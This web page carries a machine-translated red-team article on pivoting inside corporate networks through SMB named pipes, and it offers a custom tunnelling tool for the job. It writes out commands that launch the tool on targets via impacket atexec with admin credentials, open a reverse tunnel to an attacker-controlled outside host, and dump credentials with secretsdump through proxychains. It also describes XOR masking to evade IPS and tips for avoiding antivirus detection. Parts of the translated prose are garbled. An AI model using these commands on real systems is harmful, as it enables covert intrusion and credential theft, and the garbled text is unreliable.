<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏾‍🤝‍👨🏼 🐴 😭 パイプを使用したピボット 👨‍👨‍👦‍👦 🛤️ 😐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="企業のIPSがますます賢くなっていることは秘密ではありません。これで、ネットワークの境界に、またはセグメント間の企業ネットワーク内にさえ、SSL-mitmを備えたIPSを使用している人を驚くことはありません。同時に、有名なIPSに加えて、さまざまなEDRソリューションが出現し、広がり始めました。これ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>パイプを使用したピボット</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460659/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企業のIPSがますます賢くなっていることは秘密ではありません。これで、ネットワークの境界に、またはセグメント間の企業ネットワーク内にさえ、SSL-mitmを備えたIPSを使用している人を驚くことはありません。同時に、有名なIPSに加えて、さまざまなEDRソリューションが出現し、広がり始めました。これらは、ホスト上で確立された接続を直接監視しています。この点で、きちんとしたRedTeamスペシャリストは、ユビキタスなBlueTeamの見た目から毎日隠すことが難しくなっています。私は私の懸命な努力の中でもっと独創的にならなければなりません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
企業ネットワーク内の「より有用な破壊的アクション」（c）を偽装するソリューションの1つは、SMBまたはRDPプロトコルを使用することです。</font><font style="vertical-align: inherit;">あなたはそれらの中に隠れて、正当なトラフィックとして自分自身を偽装することができます。</font><font style="vertical-align: inherit;">これは特に新しいものではなく、SMB内のマスキングテクニックは、有名なAPT企業のDuquとSauronの時代から使用されています。</font><font style="vertical-align: inherit;">そこでも、SMBプロトコルを使用して制御コマンドをエージェントに転送し、成功を収めました。</font><font style="vertical-align: inherit;">この後、この手法はMetasploitおよびCobalt Strikeの開発者によって採用されました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事では、ピボットのためにSMBプロトコルを使用するためのオプションを検討しますが、RDPは後で使用します。</font></font><br>
<a name="habracut"></a><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBを使用</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それでは、ピボットにSMBを使用することの優れている点を見てみましょう。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
まず、それが広まっています。 SMBは、ほぼネイティブのMicrosoftプロトコルであり、Windowsを使用する企業ネットワークでは、あらゆる場所で多くの場所で使用されています。ここでは、DFSと、さまざまな更新プログラム、そしてプリンターと、多くのすべてのものを使用しています。とても快適。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
確かに、企業ネットワークの外部、さらには外部から445番目のTCPポートの内部では、ファイアウォールで閉じることがよくあります。この理由は、// xxxx、\\ xxxx \などのリンクを使用したフィッシングやリレーの発生率が高まっているためです。そしてもちろん、WannaCryについても忘れないでください。WannaCryは、多くの組織がポートを閉鎖せざるを得なかったためです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、Win10 / Win2016以降などの最新のシステムでは、SMBプロトコル内で送信される情報、より正確には、SMB3はデフォルトですでに暗号化されています。</font><font style="vertical-align: inherit;">それら。</font><font style="vertical-align: inherit;">SMB内でお気に入りのスプロットを転送すると、企業のIPSが気付かないようにすることができます（Micosoftに感謝します）。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
第3に、SMBプロトコルは、いわゆるパイプ（SMBパイプ）に便利なメカニズムを提供します。これらは、実際には、ネットワーク経由でのみ使用可能な同じ名前付きパイプです。</font><font style="vertical-align: inherit;">たとえば、\\ 192.168.1.10 \ pipe \ atsvcのような行は、スケジュールされたタスクサービスのパイプです。</font><font style="vertical-align: inherit;">impacketフレームワークのAtexecは、それと連携して、ウィンドウでコマンドを実行するためのタスクを作成します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysinternals：pipelist.exe（pipelist64.exe）のユーティリティを使用するか、同じpowershellを使用して、システムで開いているすべてのパイプを表示できます。</font></font><br>
<br>
<pre><code class="plaintext hljs">[System.IO.Directory]::GetFiles("\\.\\pipe\\")</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">イマージョン</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それでは、「より有用な破壊的アクション」にSMBパイプを使用する方法を見てみましょう。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
チームシェルとの秘密の通信にはパイプを使用したいと思います。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
つまり、ターゲットマシンでエージェントまたはシェルを実行し、SMBプロトコルを介してそれと通信します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
たとえば、メタスプリットには、パイプを操作するための特別なペイロードがあります：</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
meterpreter_bind_named_pipe </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
bind_named_pipe</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それらの助けを借りて、リスナー（meterpreterでも通常のコマンドシェルでも）を名前付きパイプに簡単に "吊り下げ"て、セキュリティ管理者の注意深い目から隠すことができます。</font><font style="vertical-align: inherit;">しかし、もちろん、我々はすべてが順調に彼らが言うように、侵入テスト/ redtimeと実際の労働ハッカーはカスタムツールを使用して戦闘中のMSF peylodsを使用するように完全に安全ではないことを知っている-離れて罪から... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
MSFする代わりに、コマンドシェルとして私たちの古いいずれかになります。良いヘルパー-PowerShell。</font><font style="vertical-align: inherit;">C2との通信用のチャネルとしてパイプを使用することについては、ネットワーク上に多くの例があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その1つが、ThreatexpressチームのInvoke-PipeShellユーティリティです。</font><font style="vertical-align: inherit;">サーバークライアントモードで動作し、すべてのトラフィックを256ビットのAESキーで暗号化します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サーバーで実行します。</font></font><br>
<br>
<pre><code class="plaintext hljs">Invoke-PipeShell -mode server -aeskey aaaabbbbccccdddd -pipe eventlog_svc -commandtimeout 30</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
クライアントで、次を実行します。</font></font><br>
<br>
<pre><code class="plaintext hljs">Invoke-PipeShell -mode client -server targetserver.domain.com -aeskey aaaabbbbccccdddd -pipe eventlog_svc -i -timeout 1000</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
当然、クライアントはサーバー上で承認される必要があるため、最初に承認することを忘れないでください。</font></font><br>
<br>
<pre><code class="plaintext hljs">net use \\targetserver.domain.com\IPC$ /user:admin Password1</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
接続に成功すると、完全なPowershellコンソールが表示されます。</font><font style="vertical-align: inherit;">ツールを使用した作業の詳細とコード自体は、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ラウンドにあり</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
良い。これは理解できるようです。次に、SMBパイプを介してターゲットネットワーク内をピボットする方法について考えてみましょう。たとえば、ネットワーク境界で445番目のポートのみが開いている（そしてそれが発生する...）か、SSLを介したトンネルの外部への接続が企業ファイアウォールによって容赦なくブロックされているが、何らかの理由でSMBプロトコルを閉じるのを忘れている場合。この場合、ターゲットネットワークの内部リソースを操作できるように、パイプ内で本格的なTCPトンネルを転送する必要があります。最初に頭に浮かぶのは、パイプを介してステージングする同じメータプリッターです。彼はそれを完璧に行う方法を知っています。ここでは詳細を考慮しません。ここではすべて、マニュアルに従っています。興味のある方はmetasploitの説明を読むか、こちらの短いバージョンを</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ご覧ください</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上記のmeterpreterの欠点についてはすでに述べました。</font><font style="vertical-align: inherit;">したがって、パイプを介してパイプするために他に何があるかを見てみましょう...パイプを介した</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
トンネリングのトピックに関する簡単なグーグルの後、meterpreterに加えて、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cobalt Strike</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DxFlatLine</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">からの開発</font><font style="vertical-align: inherit;">のみがあり</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ました</font></a><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
最初のオプションは最初に支払われます、そして2番目に-Meterpreterと同じ欠点があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2番目のオプションはPoCとして作成され、シングルスレッドモードでのみ機能し、1つの接続のみをトンネリングすることができます。つまり、ご想像のとおり、実際に常時使用するためのオプションではありません。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">そして何をすべきか？</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
問題について少し考えた後、私たちは決めた...なぜ我々はすでに我々の以前のRsockstun開発、適応していない</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">について書いた</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">パイプで動作するようにし、？さらに、アプリケーションアーキテクチャにより、これを簡単に行うことができます。 TCP接続の代わりに、SMB接続を使用します。ユーティリティの作業を簡素化します。SSLやプロキシサーバーを介した接続などについて心配する必要はありません。最初のクライアント認証のオプションのみをパスワードとともにサーバーに残します。パイプはパブリックエンティティであり、したがって、トンネルだけでなく、リモートを含む他のソフトウェアもパイプに対して読み取りと書き込みを行うことができます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
パイプへのアクセス権、およびリモートマシンでのパイプのスキャンと列挙は、個別のトピックです。希望する人は、scanner / smb / pipe_auditorおよびscanner / smb / pipe_rpc_auditorモジュールのメタスプロイトの例を使用してそれを学ぶことができます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Goのパイプを操作するには、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">npipe</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ライブラリを使用します</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">。</font></a></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
これは、長い間作成されており、さまざまなプロジェクトで実証されています。このライブラリを介した作業は、標準のNetメカニズムを介した作業と基本的に異なりません。同じ関数net.Dial、net.Listen、net.Acceptです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
前回と同様に、1つのパイプ内で複数の接続を多重化するには、Yamuxマルチプレクサとsocks5（プロキシサーバー）を使用します。</font><font style="vertical-align: inherit;">rsockstun </font><font style="vertical-align: inherit;">に関する</font><font style="vertical-align: inherit;">前回の</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">記事</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">で、TCPおよびyamux自体の内部での多重化の必要性について詳しく読むことができます</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
rsockstunと比較した、パイプを使用したバージョンのもう1つの違いと改良点は、yamux-server、したがってsocks5-proxyがトンネルの両端で起動できることです（同時にではなく、そこにあるか、どちらかです）。</font><font style="vertical-align: inherit;">これは、トンネルをターゲットネットワークの外部に構築できるように、またその逆もできるように行われます...</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">そして今、いつものように-ニュアンス</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
図1-Windows 7でのトンネル操作トラフィックのダンプ</font></font><br>
<br>
<img src="https://habrastorage.org/webt/o1/rt/py/o1rtpyg-ilui3_t1oov8atg7rqi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
図1は</font><font style="vertical-align: inherit;">、Windows 7 </font><font style="vertical-align: inherit;">で少なくとも1つのエンドが実行されている場合のトンネル操作の様子を示しています。ここで、赤いゾーンは承認の段階、緑はパイプの開口部、そして青-情報の直接送信。また、SMBv2プロトコルが使用されていることにも注意する必要があります。実際、これは、トンネル内で転送するすべてのものがクリアテキストで表示されることを意味します</font></font><br>
<br>
<img src="https://habrastorage.org/webt/lj/fn/fg/ljfnfgou4hrt_-96cffkpceqvoo.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。Win7とは異なり、Windows10では、SMB3プロトコル内でデータ暗号化が使用されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ry/pq/x3/rypqx33huqx-2vkluzijzskg2wa.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ご覧のように、トンネル内のパイプ名もデータもクリアテキストで送信されません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
標準のPowerShellコマンドレットGet-SmbServerConfigurationを使用して、SMB3システムで暗号化が機能するかどうかを確認できます</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wa/er/x3/waerx3qf6kifsizekiomj2iseds.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
また、暗号化をオフにすると、簡単にアクティブ化</font></font><br>
<br>
<img src="https://habrastorage.org/webt/9t/py/fx/9tpyfxifcsfzbqeldy-9rw3p3qc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
できます</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">ただし、SMB内の暗号化がデフォルトで有効になるとは限らないため、外部のサーバーやネットワークでオンにすることはお勧めできません... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この点で、トンネルでは、トンネル内でトラフィックを暗号化できるモードです。さらに、NSAスーパーコンピューターでのみ復号化できるように確実に暗号化するタスクはありませんが、IPSからトンネル内のトラフィック署名を隠すだけです。これに関して、小さなキーで単純なXORを使用してトラフィックをマスクします。これにより、プロセッサリソースを節約でき、伝送速度に実質的に影響を与えません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
トラフィックの暗号化を担当する追加のネットワークレイヤーを作成しないために、ペイロードの転送を担当するyamuxモジュール（stream.goモジュール、および読み取りおよび書き込み関数）に機能を直接追加します。</font></font><br>
<br>
<pre><code class="plaintext hljs">func xoring(istr *[]byte, key string){<font></font>
	for i := 0; i &lt; len(*istr); i++ {(*istr)[i] = (*istr)[i] ^ key[i % len(key)]}<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
変更を行った後、GETリクエストはトラフィックでそれほどはっきりと見えません。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/p9/zm/xg/p9zmxgex-2zbojqpbcjuaayqc4m.png"><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">１、２、３…スタート！</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
全体として、起動オプションと、それに応じてトンネルのアプリケーションは次のようになります。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">オプション1.</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ネットワークの外部から内部に接続し、Socks5接続を転送します。</font><font style="vertical-align: inherit;">たとえば、445番目のポートが突き出ていて、接続の信条がわかっている場合：</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
内部サーバーで、SMB接続とimpacketユーティリティを使用して、rsockpipeサーバーパーツを起動します。</font></font><br>
<br>
<pre><code class="plaintext hljs">./atexec.py administrator:adminPassw0rd@&lt;ext server IP&gt; "rsockspipe.exe -listen .\rsockspipename -pass Password1234"</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
外部（私たちが制御する）Windowsマシンで、rsockspipeのクライアント部分を実行し、接続を確立した後、それをsocks5プロキシとして使用します。</font></font><br>
<br>
<pre><code class="plaintext hljs">rsockspipe.exe -connect x.x.x.x\rsockspipename -socks y.y.y.y:1080 -pass Pass-word1234<font></font>
proxychains secretsdump.py admin:Passw0rd@y.y.1.10</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">オプション2.</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> SMBプロトコルによる裏返しの接続。</font><font style="vertical-align: inherit;">すべてのWebプロトコルを介した外部への接続が厳重に監視され、何らかの理由で管理者がSMBを忘れた場合... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
外部（私たちが制御）Windowsマシン（ip：YYYY）で、rsockspipeのクライアント部分を起動し、クライアントが接続するのを待ちます。</font></font><br>
<br>
<pre><code class="plaintext hljs">rsockspipe.exe -listen .\rsockspipename -socks y.y.y.y:1080 -pass Password1234</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ターゲットネットワーク内のサーバーで、クライアントパーツを実行します（同様にimpacketを介して）。</font></font><br>
<br>
<pre><code class="plaintext hljs">./atexec.py administrator:adminPassw0rd@&lt;ext server IP&gt; "rsockspipe.exe -connect Y.Y.Y.Y\rsockspipename -pass Password1234"</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
接続が成功したら、サーバーをsoscks5として使用できます。</font></font><br>
<br>
<pre><code class="plaintext hljs">proxychains secretsdump.py admin:Passw0rd@y.y.1.10</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここでは、特に2番目のオプションについて、1つのポイントがあります。</font><font style="vertical-align: inherit;">パイプへの接続を成功させるには、サーバー側、つまり、</font><font style="vertical-align: inherit;">トンネルを開始する前に、承認を通過する必要があります。</font><font style="vertical-align: inherit;">あなたはこの方法でそれを行うことができます：</font></font><br>
<br>
<pre><code class="plaintext hljs">net use \\y.y.y.y\ipc$ /user:&lt;usrname&gt; &lt;Password1&gt;</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって... 2番目の使用例では、net useコマンドがターゲットマシンで実行されます。</font><font style="vertical-align: inherit;">これは、ターゲットマシン（lsassプロセスのメモリ内）にWindowsマシンからのクレジットが残っていることを意味します。</font><font style="vertical-align: inherit;">そして、それらが管理者である場合（そして原則として、すべての初心者ハッカーが管理者から作業を行います...）、これはBlueTeamからの「バックグリーティング」につながる可能性があります...一般的に、何かをすると...</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">結論の代わりに</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
一般的に、トンネルはかなり良いことが判明しました...主なことは、アクティブな使用の準備ができていることです。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ソースコード、およびx86とx64向けにコンパイル済みのバイナリは、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">git</font></font></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
およびAに追加されています。最近、Win GUIモードでコンパイルされたGolangソフトウェア（モードでのコンパイル：go build -ldflags = "-H windowsgui"）が一部のアンチウイルスソリューション（KAV、SEP14）によって非常に起動されていることに気付き始めました。それはすでにばかげています-GUIモードでコンパイルされた「Hello World」はマルウェアとして検出されます。どうやら、これはGolangがマルウェアのお気に入りのツールになっているためです。そのため、標準のコンソールモードでプロジェクトをコンパイルすることをお勧めします。黒いcmf-windowを使用すると、実際のハッカーはその処理方法を知っています（たとえば、同じインパケットなど）。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
PS「より有用な破壊的アクション」は、BiZoneのディレクターであるD. Samartsevの言葉です。</font><font style="vertical-align: inherit;">この場合、RedTeamスペシャリストの仕事の本質を最も正確に説明しています。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja460643/index.html">球上の点の均一な分布</a></li>
<li><a href="../ja460645/index.html">良いこと、悪いこと：Goで邪悪なコードを書く、パート1</a></li>
<li><a href="../ja460647/index.html">pwnable.kr 05-パスコードでジョブを解決します。フォーマット文字列の脆弱性によるプロシージャリンクテーブルの書き換え</a></li>
<li><a href="../ja460651/index.html">匿名テスター協会の会議：TMS、モニタリングモニタリング、検索品質評価、ネイティブiOSテスト</a></li>
<li><a href="../ja460655/index.html">電報を壊した方法</a></li>
<li><a href="../ja460661/index.html">Node.jsについて知っておくべきこと</a></li>
<li><a href="../ja460665/index.html">ドラフトFAQ：C ++標準が3年ごとに出てくるのはなぜですか？</a></li>
<li><a href="../ja460667/index.html">iOSでの有料サービスのテストの自動化</a></li>
<li><a href="../ja460669/index.html">開発の安全を確保し、時間と神経を節約する方法</a></li>
<li><a href="../ja460671/index.html">Dでの所有権と借用</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>